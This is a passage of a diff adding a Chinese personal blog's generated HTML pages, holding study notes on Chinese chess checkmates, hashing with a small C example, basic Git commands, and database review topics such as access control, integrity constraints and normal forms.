+<p>条件2：将无法左右移动（有我方帅照着，或马照着，或将左右路被他自己的子挡住等）</p>
+<h3 id="三车闹士"><a href="#三车闹士" class="headerlink" title="三车闹士"></a>三车闹士</h3><p>三个车+兵限制士的走法形成绝杀。</p>
+<blockquote>
+<p>注意兵与车不同，兵无法后退，即不能将后面的军。</p>
+</blockquote>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://imane219.github.io/project/2021/02/25/%E5%9F%BA%E6%9C%AC%E6%9D%80%E6%B3%95/" data-id="ckr5o9zys000xxkurep3l7ixe" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/project/tags/%E4%B8%AD%E5%9B%BD%E8%B1%A1%E6%A3%8B/" rel="tag">中国象棋</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-算法初步" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/project/2021/02/09/%E7%AE%97%E6%B3%95%E5%88%9D%E6%AD%A5/" class="article-date">
+  <time datetime="2021-02-09T03:53:02.000Z" itemprop="datePublished">2021-02-09</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/project/categories/%E7%AE%97%E6%B3%95/">算法</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/project/2021/02/09/%E7%AE%97%E6%B3%95%E5%88%9D%E6%AD%A5/">算法初步</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h3><p>待补充</p>
+<h3 id="散列-hash"><a href="#散列-hash" class="headerlink" title="散列(hash)"></a>散列(hash)</h3><p>有一种空间换时间的方法，通过将输入的数作为<strong>数组的下标</strong>来对这个数的性质进行统计，但当输入的数很大，或者甚至不是数而是字符串，就需要用<strong>散列</strong>来将输入元素通过hash函数转换成尽量唯一的整数，从而继续空间换时间。如果元素在转换前是==key==，在转换后就是整数==H(key)==，即==key==是输入的数，==H(key)==则是数组下标。下面就key的类型进行讨论。</p>
+<h4 id="1-整数散列"><a href="#1-整数散列" class="headerlink" title="1.整数散列"></a>1.整数散列</h4><p>当key为整数时，hash函数通常有：<strong>直接定址法</strong>（H(key)是key的线性变换），<strong>平方取中法</strong>，<strong>除留余数法</strong>。</p>
+<p>其中<strong>除留余数法</strong>比较常用：H(key) = key % mod</p>
+<p>当mod为素数的时候H(key)可以尽可能地覆盖范围内的每一个数，且数组长度不能长于mod，于是常取 数组长度==mod.</p>
+<p>易知这样很容易有两个key对应同一个H(key)值的情况，称之为<strong>冲突</strong>，解决冲突的办法有以下三种：</p>
+<ul>
+<li>线性探索法：即当key映射成H(key)之后，发现数组H(key)下标已经被其他的数占据，则顺位后移，即H(key)^’^ = H(key)+1，依次循环寻找直到找到空的位置为止。</li>
+<li>平方探查法：同上，发现冲突后，不是依次向后探查，而是+- 1^2^, +- 2^2^……这样探查 </li>
+<li>链地址法（拉链法）：将所有H(key)相同的key链成一条单链表</li>
+</ul>
+<h4 id="2-字符串hash"><a href="#2-字符串hash" class="headerlink" title="2.字符串hash"></a>2.字符串hash</h4><p><strong>初步：</strong></p>
+<ul>
+<li><p>将二维整点映射成整数：H(x,y) = x*range + y (0 &lt;= x,y &lt;= range)</p>
+</li>
+<li><p>将字符串映射成整数：(假设字符串由a-z 26位小写字母组成)</p>
+<ul>
+<li><p>将a-z对应为0-25，则长度为len的字符串即理解为长度为len的26进制数</p>
+</li>
+<li><p>将26进制数转换成10进制数来唯一表示映射后的整数，代码如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hashfuc</span><span class="params">(<span class="keyword">char</span> *s, <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> id = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		id = id * <span class="number">26</span> + s[i] - <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+</ul>
+<h3 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h3>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://imane219.github.io/project/2021/02/09/%E7%AE%97%E6%B3%95%E5%88%9D%E6%AD%A5/" data-id="ckr5o9zzg002ixkur976w5t06" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/project/tags/%E6%8E%92%E5%BA%8F/" rel="tag">排序</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/project/tags/%E6%95%A3%E5%88%97/" rel="tag">散列</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/project/tags/%E9%80%92%E5%BD%92/" rel="tag">递归</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-Git" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/project/2021/01/26/Git/" class="article-date">
+  <time datetime="2021-01-26T12:44:04.000Z" itemprop="datePublished">2021-01-26</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/project/categories/Git/">Git</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/project/2021/01/26/Git/">Git</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>Git有工作区，暂存区，版本库三个概念</p>
+<p><strong>工作区：</strong>是本地的项目目录</p>
+<p><strong>暂存区(stage/index)：</strong>是进行操作时暂时存放文件的地方。他一般存放于==.git/index==中。其中.git是本地项目中的一个隐藏文件，他虽然在项目目录中但却不属于工作区。</p>
+<p><strong>版本库：</strong>即==.git==目录</p>
+<p>他们之间的关系如图所示：</p>
+<p><img src="%E5%9B%BE1.png"></p>
+<p>其中objects是git的对象库，位于==.git/objects==目录下。</p>
+<p>master分支即当前分支，也就是本地仓库，push到远程就是push的head指向的分支。</p>
+<h2 id="Git创建仓库"><a href="#Git创建仓库" class="headerlink" title="Git创建仓库"></a>Git创建仓库</h2><p><strong>git init：</strong>使当前执行目录成为一个git仓库，会生成.git目录，一般是隐藏的</p>
+<p><strong>git init newrepo：</strong>会在当前执行路径下创建newrepo并将其作为git仓库，即在newrepo中创建.git目录</p>
+<blockquote>
+<p>若当前目录中有其他的文件，需要将部分纳入版本控制，则使用==git add==命令告诉Git对这些文件进行跟踪，然后使用==git commit==提交</p>
+</blockquote>
+<p><strong>git clone repo：</strong>从现有的git仓库repo中拷贝项目</p>
+<p><strong>git clone repo directory：</strong>将仓库拷贝到本地目录directory中</p>
+<blockquote>
+<p>Github中的ssh链接以.git结尾即是git仓库</p>
+</blockquote>
+<p><strong>git config：</strong>设置git</p>
+<p><strong>git config –list：</strong>列出配置信息</p>
+<p><strong>git config -e：</strong>修改配置文件（针对当前仓库）</p>
+<p><strong>git config -e –global：</strong>修改配置文件（针对系统上所有仓库）</p>
+<p><strong>git config –global user.name “xxx”：</strong>设置用户名（若去掉global只对当前仓库有效）</p>
+<p><strong>git config –global user.email <a href="mailto:&#120;&#x78;&#x78;&#120;&#120;&#x40;&#x78;&#x78;&#46;&#x63;&#x6f;&#109;">&#120;&#x78;&#x78;&#120;&#120;&#x40;&#x78;&#x78;&#46;&#x63;&#x6f;&#109;</a>：</strong>设置用户邮箱信息（若去掉global只对当前仓库有效）</p>
+<h2 id="Git基本操作"><a href="#Git基本操作" class="headerlink" title="Git基本操作"></a>Git基本操作</h2><p><img src="%E5%9B%BE2.png"></p>
+<p>有了==.git==之后就可以执行这些操作了</p>
+<p><strong>git clone usr/ssh [newname]：</strong>将远程仓库拷贝到本地，不指定新名字则按照url中最后一个目录名</p>
+<p><strong>git clone -b branch1 <a target="_blank" rel="noopener" href="http://www.github/sdfd.git%EF%BC%9A">www.github/sdfd.git：</a></strong>将远程仓库的分支branch1拷贝到本地</p>
+<p><strong>git add [file1] [file2] …/ [dir] / . ：</strong>将本地文件存在缓冲区中，==.==代表全部文件</p>
+<blockquote>
+<p>git status -s可以获得仓库文件状态，用来查看文件是否添加到缓存，是否有修改等等</p>
+<p>git diff可以查看文件在暂存区和工作区的差异</p>
+</blockquote>
+<p><strong>git commit -m [message]：</strong>将缓冲区的内容写入本地仓库</p>
+<blockquote>
+<p>此时如果git status则会看到==nothing to commit==,即表示上次提交后没有做任何改动</p>
+<p>git log可以查看历史提交记录</p>
+</blockquote>
+<p><strong>git reset：</strong>可以指定退回某一次提交的版本</p>
+<p><strong>git rm [–cached] file：</strong>将文件从暂存区和工作区删除，若加上cached则表示仅删除缓冲区中的文件</p>
+<blockquote>
+<p>-r表示递归删除，即file是目录的话</p>
+<p>-f表示强制删除，如果要删除已修改并存于暂存区的文件的话需要使用</p>
+</blockquote>
+<p><strong>git fetch：</strong>将远程分支有本地分支没有的内容获取到本地仓库中</p>
+<p><strong>git merge：</strong>将获取到的内容和本地分支合并</p>
+<p><strong>git pull：</strong>即git fetch + git merge</p>
+<p><strong>git remote add origin <code>https://github.com/xxx.git</code>：</strong>让origin指向远程库<br><strong>git push -u origin master：</strong>将origin的master分支和本地分支（当前分支）相关联</p>
+<p><strong>git push：</strong>将本地分支上传到远程分支并合并</p>
+<p><strong>git push [-f] origin main:branch1：</strong>把当前的本地分支（main）push到远程branch1中，比如合作者只能在branch1提交自己的代码，不能修改远程仓库中的main分支，当主管审核之后可以将branch1合并。-f表示强制，当远程分支和自己的内容不同，而你确定自己本地的是最新的，远程的是不需要的，则可以使用-f强制覆盖远程仓库。</p>
+<blockquote>
+<p>Github目前的主分支名不再是master而是main</p>
+<p>所以可能有如下报错，将master改成main即可</p>
+<p><img src="%E5%9B%BE3.png"></p>
+</blockquote>
+<h2 id="Git分支管理"><a href="#Git分支管理" class="headerlink" title="Git分支管理"></a>Git分支管理</h2><h2 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h2><ul>
+<li><p>今天git clone的时候报错无法连接远程仓库，查找资料后解决办法为输入<code>ssh-agent bash</code>命令开启ssh代理。</p>
+<p><img src="%E5%9B%BE4.png"></p>
+</li>
+<li><p>git clone一个新的仓库无需git init，这样会导致外面文件夹有.git里面项目文件夹也有.git。git clone的时候会自动在项目文件夹里面创建.git</p>
+</li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://imane219.github.io/project/2021/01/26/Git/" data-id="ckr5o9zy30001xkurhc5me15i" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/project/tags/Git/" rel="tag">Git</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-数据库复习" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/project/2020/11/28/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0/" class="article-date">
+  <time datetime="2020-11-28T00:30:30.000Z" itemprop="datePublished">2020-11-28</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/project/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/">数据库</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/project/2020/11/28/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0/">数据库</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><h3 id="数据库基本概念"><a href="#数据库基本概念" class="headerlink" title="数据库基本概念"></a>数据库基本概念</h3><p><strong>数据库四个基本概念：</strong></p>
+<p>数据（Data）——永久存储，有组织，可共享</p>
+<p>数据库（Database），数据库管理系统（DBMS)，数据库系统（DBS）</p>
+<p><strong>数据库（DB）的基本特征：</strong></p>
+<ol>
+<li>数据按一定的数据模型组织、描述和储存</li>
+<li>可为各种用户共享</li>
+<li>冗余度较小</li>
+<li>数据独立性较高</li>
+<li>易扩展</li>
+</ol>
+<p><strong>数据库管理系统(DBMS)：</strong></p>
+<p><u>用途</u>：科学地组织和存储数据，高效地获取和维护数据</p>
+<p><u>主要功能</u>：</p>
+<ol>
+<li>数据定义——提供数据定义语言（DDL），定义数据对象（table，view）</li>
+<li>数据组织、存储和管理</li>
+<li>数据操纵——提供数据操纵语言（DML），实现基本操作（增删改查）</li>
+<li>数据库的事物管理和运行管理</li>
+<li>数据库的建立和维护功能<ul>
+<li>数据控制：</li>
+<li>数据的安全性保护</li>
+<li>数据的完整性检查</li>
+<li>并发控制</li>
+<li>数据库恢复</li>
+</ul>
+</li>
+<li>其它</li>
+</ol>
+<p><u>优点</u>：简化了应用程序的编制，减少了应用程序的维护和修改</p>
+<p><strong>数据库系统的构成：</strong></p>
+<p>数据库、数据库管理系统（及其应用开发工具）、应用数据、数据库管理员</p>
+<p><img src="%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F.png" alt="数据库系统"></p>
+<p><strong>数据库系统的特点：</strong></p>
+<ol>
+<li>数据结构化——数据用数据模型描述</li>
+<li>数据的共享性高，冗余度低且易扩充</li>
+<li>数据独立性高——物理独立性（应用程序和物理存储独立），逻辑独立性（应用程序和逻辑结构独立）</li>
+<li>数据由DBMS统一管理和控制——数据的安全性保护，数据的完整性检查、并发控制、数据库恢复</li>
+</ol>
+<p><u>文件系统</u>：共享性差、冗余度大、记录内有结构整体无结构、独立性差、所有文件副本必须同时更新</p>
+<p><u>联系</u>：都是管理数据库的软件。操作系统可以解析文件系统，而数据库系统独立于操作系统。数据库系统的存储和组织是通过操作系统中的文件系统完成的。</p>
+<p><strong>数据库系统的三级模式结构：</strong></p>
+<p>数据的逻辑结构和物理结构变了，应用程序可以不变。</p>
+<ol>
+<li><p>模式（逻辑模式）：全体数据逻辑结构和特征的描述，所有用户的公共数据视图。一个数据库只有一个模式。包括：数据的逻辑结构、数据之间的联系、数据有关的安全性、完整性要求。</p>
+<p>例：数据库中全部关系模式和约束集合</p>
+</li>
+<li><p>外模式（子模式，用户模式）：用户使用的局部逻辑结构，模式的子集。一个模式可以有多个外模式，一个外模式可以供给多个应用程序</p>
+<p>用途：支持不同用户建立适应局部应用特征的结构，简化应用处理，提高安全性</p>
+</li>
+<li><p>内模式（存储模式）：数据的物理结构和存储方式的描述。一个数据库只有一个。独立于存储设备。</p>
+</li>
+</ol>
+<p><strong>数据库的二级映像功能：</strong></p>
+<ol>
+<li>外模式/模式映像：模式改变时对映像做改变使外模式不变，保证了数据与程序的逻辑独立性(多个)</li>
+<li>模式/内模式映像：当存储结构改变，修改映像使模式不变，保证了数据与程序的物理独立性(唯一)</li>
+</ol>
+<p>保证了数据库外模式的稳定性，从底层保证了应用程序的稳定性。</p>
+<p><strong>数据模型：</strong></p>
+<p>数据结构、数据操作、数据的完整性约束条件</p>
+<ol>
+<li>概念模型<ul>
+<li>按用户的观点对数据和信息建模</li>
+</ul>
+</li>
+<li>逻辑模型和物理模型<ul>
+<li>逻辑模型：网状模型、层次模型、关系模型等，按计算机系统的观点对数据建模，用于DBMS实现</li>
+<li>物理模型：数据在系统内部（磁盘或磁带）的表示方法和存取方法</li>
+</ul>
+</li>
+</ol>
+<p><strong>层次模型：</strong></p>
+<p>树形，根节点之外的其他结点有且只有一个双亲结点</p>
+<ul>
+<li>只能处理一对多的实体联系</li>
+<li>任何记录只有按路径查看才能显出全部意义</li>
+<li>没有一个子女记录能脱离双亲记录而存在</li>
+</ul>
+<p>完整性约束：</p>
+<ul>
+<li>无相应的双亲结点值就不能插入子女结点值</li>
+<li>如果删除双亲结点子女结点也同时删除</li>
+<li>更新操作应更新所有相应记录</li>
+</ul>
+<p>优点：</p>
+<ul>
+<li>数据结构简单清晰</li>
+<li>查询效率高，优于关系模型不低于网状模型</li>
+<li>有良好的完整性支持</li>
+</ul>
+<p>缺点：</p>
+<ul>
+<li>多对多联系表示不自然</li>
+<li>对插入删除限制多</li>
+<li>查询子女必须通过双亲</li>
+</ul>
+<p><strong>网状模型：</strong></p>
+<p>允许无双亲和多个双亲，一对多</p>
+<p>优点：</p>
+<ul>
+<li>能更直接的描述现实世界</li>
+<li>具有良好的性能</li>
+</ul>
+<p>缺点：</p>
+<ul>
+<li>结构复杂</li>
+<li>DDL,DML语言复杂</li>
+<li>用户需要了解系统结构的细节</li>
+</ul>
+<p><strong>关系模型：</strong></p>
+<ul>
+<li>候选码：一组属性能唯一标识一个元组，而其子集不能</li>
+<li>主属性：候选码的属性，一组则是一组属性</li>
+<li>主码：选定的一个候选码</li>
+<li>域：一组具有相同数据类型的值的集合</li>
+<li>分量：元组中一个属性值</li>
+<li>关系模式：对关系的描述（“学生（学号，姓名，……）”）</li>
+</ul>
+<p>规范条件：关系的每一个分量必须是不可分的数据项</p>
+<p>关系的完整性：</p>
+<ol>
+<li><p>实体完整性</p>
+<p>主属性不能取空值</p>
+</li>
+<li><p>参照完整性</p>
+<p>当另一个关系S的主码Ks成为一个关系R的属性F（非码属性），则F是R的外码，R为参照关系，S为被参照关系。</p>
+<p>R中的每个元组在F上的值必须：要么取空值，要么等于S中某个元组的主码（Ks）值。</p>
+</li>
+<li><p>用户定义的完整性</p>
+</li>
+</ol>
+<p>优点：</p>
+<ul>
+<li>建立在严格的数学概念基础上</li>
+<li>概念单一（实体和联系以及结果都用关系表示）</li>
+<li>关系模型的存取路径对用户透明（数据独立性高，安全性高，简化程序员工作）</li>
+</ul>
+<p>缺点：</p>
+<ul>
+<li>存取路径对用户透明，查询效率往往不如格式化数据</li>
+<li>为提高性能必须对查询请求优化，增加管理难度</li>
+</ul>
+<p><strong>数据模型的组成要素：</strong></p>
+<p>数据结构（静态特性）、数据操作（动态特性）、数据的完整性约束条件</p>
+<h3 id="关系代数"><a href="#关系代数" class="headerlink" title="关系代数"></a>关系代数</h3><p><strong>关系操作：</strong>查询——<strong>选择、投影</strong>、连接、除、<strong>并、差</strong>、交、<strong>笛卡尔积</strong></p>
+<p>sql——数据定义语言、数据操纵语言、数据控制语言</p>
+<p>关系相容：具有相同的度且两者第i个属性来自同一个域</p>
+<h3 id="数据库安全性"><a href="#数据库安全性" class="headerlink" title="数据库安全性"></a>数据库安全性</h3><p><strong>实现数据库系统安全性的技术和方法：</strong></p>
+<p><u>用户身份认证、访问/存取控制技术</u>、视图技术、审计技术、数据加密存储和加密传输</p>
+<p><strong>访问控制流程：</strong></p>
+<ol>
+<li><p>DBMS对提出访问请求的数据库用户进行身份认证</p>
+<ul>
+<li><p>用户身份认证：用户标识——用户名+UID</p>
+<p>静态口令认证、动态口令认证、生物特征认证、智能卡认证</p>
+</li>
+</ul>
+</li>
+<li><p>在处理层进行自主访问控制和强制访问控制</p>
+<ul>
+<li>访问控制：定义用户权限+合法权限检查——访问控制子系统</li>
+<li>自主访问控制（DAC）：不同用户对不同的对象有不同权限，用户可以将权限授予他人</li>
+<li>强制访问控制（MAC）：每个数据对象标定一个密级，每个用户授予一个级别的许可证，根据级别访问</li>
+</ul>
+</li>
+<li><p>对用户访问行为和关键操作进行审计，对异常用户行为进行简单入侵检测</p>
+</li>
+</ol>
+<p><strong>自主访问控制方法：</strong></p>
+<ol>
+<li>GRANT<ul>
+<li>GRANT select/all priviliges/update(Sno) ON TABLE sc,course TO u1,u2/public [WITH GRANT OPTION];</li>
+</ul>
+</li>
+<li>REVOKE<ul>
+<li>REVOKE select ON TABLE sc FROM u1 [CASCADE/RESTRICT];</li>
+</ul>
+</li>
+<li>创建用户<ul>
+<li>CREATE USER u1 [WITH] [DBA|RESOURCE|CONNECT];</li>
+<li>CONNECT:默认权限，只能登陆数据库</li>
+<li>RESOURCE:能创建基本表和视图，不能创建模式、新用户</li>
+<li>DBA:啥都能干</li>
+</ul>
+</li>
+<li>数据库角色——权限的集合<ul>
+<li>CREATE ROLE r1；</li>
+<li>GRANT select ON TABLE student TO r1;//可重复使用该句增加r1权限</li>
+<li>GRANT r1 TO u1,r2 [WITH ADMIN OPTION];//授予者是r1权限拥有者</li>
+<li>REVOKE r1 FROM u1;//可重复使用该句收回r1某个权限</li>
+</ul>
+</li>
+</ol>
+<p><strong>强制访问控制方法：</strong></p>
+<p>敏感度标记：TS&gt;=S&gt;=C&gt;=P</p>
+<p>主体的许可证级别<strong>大于或等于</strong>客体的密级时，才能<strong>读</strong>客体</p>
+<p>主体的许可证级别<strong>小于或等于</strong>客体的密级时，才能<strong>写</strong>客体</p>
+<p>实现强制访问控制时首先要实现自主访问控制</p>
+<p><strong>视图机制：</strong></p>
+<p>把要保密的数据对用户隐藏，间接支持存取谓词的用户权限定义</p>
+<p>CREATE VIEW v1 AS (select * from student where sdept=’cs’);</p>
+<p>GRANT select ON v1 TO u1;</p>
+<p><strong>审计（AUDIT）：</strong></p>
+<ul>
+<li>AUDIT update ON sc;</li>
+<li>NOAUDIT update ON sc;</li>
+</ul>
+<p><strong>数据加密：</strong></p>
+<ol>
+<li>存储加密<ul>
+<li>透明存储加密<ul>
+<li>内核级加密保护方式，对用户完全透明</li>
+<li>数据写到磁盘时加密，授权用户读取时解密。</li>
+<li>应用程序只需在创建表语句中说明加密的字段即可</li>
+</ul>
+</li>
+<li>非透明存储加密<ul>
+<li>通过多个加密函数实现</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>传输加密<ul>
+<li>链路加密<ul>
+<li>在链路层进行</li>
+<li>报文和报头均加密</li>
+</ul>
+</li>
+<li>端到端加密<ul>
+<li>发送端加密，接收端解密</li>
+<li>只加密报文</li>
+<li>所需密码设备数量较少，容易被非法监听者发现并获取敏感信息</li>
+</ul>
+</li>
+<li>基于安全套接层协议(SSL)传输方案的实现思路<ul>
+<li>确认通信双方端点的可靠性</li>
+<li>协商加密算法和密钥</li>
+<li>可靠数据传输</li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+<p><strong>其他安全性保护：</strong></p>
+<ol>
+<li><p>推理控制</p>
+<ul>
+<li>基于函数依赖的推理控制</li>
+<li>基于敏感关联的推理控制</li>
+</ul>
+</li>
+<li><p>隐蔽信道</p>
+</li>
+<li><p>数据隐私保护</p>
+</li>
+</ol>
+<h3 id="数据库完整性"><a href="#数据库完整性" class="headerlink" title="数据库完整性"></a>数据库完整性</h3><p><strong>实体完整性</strong>——主属性不能取空值且能唯一标识元组</p>
+<ol>
+<li>列级定义：create table字段后加 PRIMARY KEY</li>
+<li>表级定义：create table sc( xxxxx, PRIMARY KEY(Sno,Cno));</li>
+<li>检查和违约处理：<ul>
+<li>检查主码值是否唯一，不唯一则拒绝插入or修改（全表扫描/在主码上建立索引）</li>
+<li>检查主码是否为空，有一个为空则拒绝插入or修改</li>
+</ul>
+</li>
+</ol>
+<p><strong>参照完整性</strong></p>
+<ol>
+<li>表级：create table sc( xxxxx, FOREIGN KEY(Sno) REFERENCES student(Sno) [ON DELETE CASCADE ] [ON UPDATE NO ACTION]);</li>
+<li>检查和违约处理：<ul>
+<li>sc表中增加or修改了Sno不在student中的元组——拒绝</li>
+<li>student表中删除or修改了一些元组使sc表中一些Sno无法在studnet中找到——拒绝NO ACTION/级联删除or修改CASCADE/设置为空SET NULL</li>
+</ul>
+</li>
+</ol>
+<p><strong>用户定义的完整性</strong></p>
+<ol>
+<li>属性上的：NOT NULL,UNIQUE（可以为空）,CHECK</li>
+<li>元组上的：CHECK (Ssex=’女’ OR Sname NOT LIKE ‘Ms.%’)</li>
+<li>检查和违约处理：拒绝</li>
+</ol>
+<p><strong>完整性约束命名子句</strong></p>
+<ol>
+<li>create table sc( xxxxx, CONSTRAINT C1 FOREIGN KEY(Sno) REFERENCES student(Sno) [ON DELETE CASCADE ] [ON UPDATE NO ACTION]);</li>
+<li>ALTER TABLE sc DROP/ADD CONSTRAINT C1 xxx;</li>
+</ol>
+<p><strong>断言</strong></p>
+<p>不满足断言为真值的语句会被拒绝执行</p>
+<ol>
+<li>CREATE ASSERTION A1 CHECK(60 &gt;= (select xxxxx))//可以设置子句，比表级约束更具一般性</li>
+<li>DROP ASSERTION A1;</li>
+</ol>
+<p><strong>触发器</strong></p>
+<p>触发器保存在数据库服务器中</p>
+<p>触发器只能定义在基本表上，表的拥有者才可以创建触发器，触发器和表必须在同一个模式下，同一个模式中触发器名唯一。</p>
+<ol>
+<li><p>CREATE TRIGGER T1 BEFORE/AFTER update OR insert [OF grade] ON sc FOR EACH ROW/STATEMENT [WHEN(xxx)] [BEGIN] 命令语句 [END];</p>
+</li>
+<li><p>注：如果是row级触发器，在过程体中可以使用new和old引用事件之后的新值和事件之前的旧值。</p>
+</li>
+<li><p>如果触发器动作体执行失败，激活触发器的事件就会停止执行，触发器可能影响的其他对象不发生任何变化。</p>
+</li>
+<li><p>DROP TRIGGER T1 ON sc;//只能由有权限的用户删除</p>
+</li>
+</ol>
+<h3 id="关系数据库理论"><a href="#关系数据库理论" class="headerlink" title="关系数据库理论"></a>关系数据库理论</h3><p>关系模式R&lt;U,F&gt;：U一组属性，F属性组上的数据依赖（D，DOM——域和属性向域的映像）</p>
+<p><u>好的关系模式</u>：尽可能少数据冗余、没有更新异常、没有插入异常、没有删除异常</p>
+<p><strong>函数依赖：</strong></p>
+<p>$X \rightarrow Y$: X函数确定Y/Y函数依赖于X</p>
+<p>$X \leftrightarrow Y$: $X\rightarrow Y$ 且 $Y \rightarrow X$</p>
+<p>$X \nrightarrow Y$: Y不函数依赖于X</p>
+<p>$X \rightarrow Y$ 且 $Y \not\subseteq X$ : 非平凡函数依赖</p>
+<p>$X \rightarrow Y$ 且 $Y \subseteq X$ : 平凡函数依赖，恒成立</p>
+<p>$ X\stackrel{F}{\longrightarrow} Y$ :  Y对X完全函数依赖（X能决定Y，但是X的任意真子集都不能决定Y）</p>
+<p>$ X\stackrel{P}{\longrightarrow} Y$ : Y对X部分函数依赖（X能决定Y，但不是完全函数依赖）</p>
+<p>$ X\stackrel{传递}{\longrightarrow} Z$ ：Z对X传递函数依赖：X决定Y（非平凡）且Y不能决定X，Y决定Z（非平凡）</p>
+<p><strong>范式：</strong></p>
+<p><img src="1606916927528.png" alt="1606916927528"></p>
+<ol>
+<li><p>1NF——每个属性不可再分（规范化关系）</p>
+<p>问题：数据冗余、插入异常、删除异常、更新复杂</p>
+<p>原因：非主属性对候选码有部分函数依赖（依赖于候选码的子集）</p>
+</li>
+<li><p>2NF——1NF+每个非主属性完全依赖于所有候选码</p>
+<p>问题：数据冗余、插入异常、删除异常、更新复杂（只解决了部分）</p>
+<p>原因：非主属性对候选码的传递依赖</p>
+<p>推论：1NF+候选码为单个属性=2NF</p>
+</li>
+<li><p>3NF——1NF+没有非主属性对码的传递依赖</p>
+<p>问题：数据冗余、插入异常、删除异常、更新复杂（只解决了部分）</p>
+<p>原因：主属性对候选码部分依赖和传递依赖</p>
+<p>推论：3NF必是2NF；2NF+至多一个非主属性=3NF；二元关系必是3NF</p>
+</li>
+<li><p>BCNF——1NF+每一个决定属性集都含有码</p>
+<p>实现彻底分离，消除异常</p>
+</li>
+</ol>
+<h3 id="数据库设计"><a href="#数据库设计" class="headerlink" title="数据库设计"></a>数据库设计</h3><p><strong>基本步骤：</strong></p>
+<ol>
+<li><p>需求分析</p>
+<p>数据字典：数据流图中数据的描述，在需求分析阶段建立，不断修改完善。是进行详细数据收集和分析的结果。包括，数据项、数据结构、数据流、数据存储、处理过程。</p>
+</li>
+<li><p>概念结构设计</p>
+<p>将需求抽象为概念模型。</p>
+</li>
+<li><p>逻辑结构设计</p>
+<p>ER图变关系模型：一个实体型一个关系模式，一个联系一个关系模式（单独一个：各实体的码+联系的属性；和某端合并：加上对方的码和联系的属性），具有相同码的关系模式可以合并</p>
+<p>数据模型优化：确定数据依赖，对依赖分析优化</p>
+</li>
+<li><p>物理结构设计</p>
+<p>物理结构：数据库在物理设备上的存储结构（设计存放位置）和存取方法（索引）</p>
+<p>评价方案：存储空间、存取时间、维护代价</p>
+</li>
+<li><p>数据库实施</p>
+<p>数据载入，数据库试运行（分期入库，转储恢复）</p>
+</li>
+<li><p>数据库运行和维护</p>
+<p>转储恢复，安全性完整性控制、性能监督分析改进、数据库的重组织和重构造</p>
+</li>
+</ol>
+<p><strong>ER图冲突：</strong></p>
+<ul>
+<li>属性冲突——同一属性的域定义冲突</li>
+<li>命名冲突——不同意义相同名字，相同意义不同名字</li>
+<li>结构冲突——同一对象在不同应用中具有不同的抽象</li>
+</ul>
+<h3 id="数据库恢复技术"><a href="#数据库恢复技术" class="headerlink" title="数据库恢复技术"></a>数据库恢复技术</h3><p><strong>事物：</strong></p>
+<p>BEGIN TRANSACTION</p>
+<p>xxx</p>
+<p>COMMIT;//提交事务所有操作，更新写入磁盘中</p>
